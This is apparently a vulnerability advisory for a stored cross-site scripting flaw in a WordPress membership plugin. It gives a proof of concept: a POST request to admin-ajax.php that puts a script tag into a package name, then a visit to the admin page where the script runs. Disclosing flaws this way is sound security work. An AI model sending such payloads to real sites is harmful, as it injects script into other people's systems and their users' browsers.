Description
========================================================================
========

Once a user is registered he can add new subscription packages or
modify existing ones. No data sanitization is
taking place before saving package details in DB. This allows a
malicious user to include JS code in package name
and/or package description.

PoC
========================================================================
========

- - Send a post request to
`http://vuln.site.tld/wp-admin/admin-ajax.php` with data:
`action=package_add_new&p_name=a<script>alert(1)</script>`
- - Visit
`http://vuln.site.tld/wp-admin/admin.php?page=userultra&tab=membership`
